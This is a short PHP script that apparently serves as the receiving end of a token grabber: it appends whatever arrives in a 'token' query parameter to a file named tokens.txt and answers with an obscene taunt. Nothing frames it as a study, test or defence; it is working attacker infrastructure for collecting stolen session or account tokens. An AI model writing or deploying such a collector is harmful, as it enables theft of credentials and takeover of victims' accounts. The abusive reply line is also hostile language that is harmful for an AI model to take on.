<?php
file_put_contents('tokens.txt', $_GET['token'] . PHP_EOL, FILE_APPEND | LOCK_EX);
echo "GET FUCKED BITCH!";

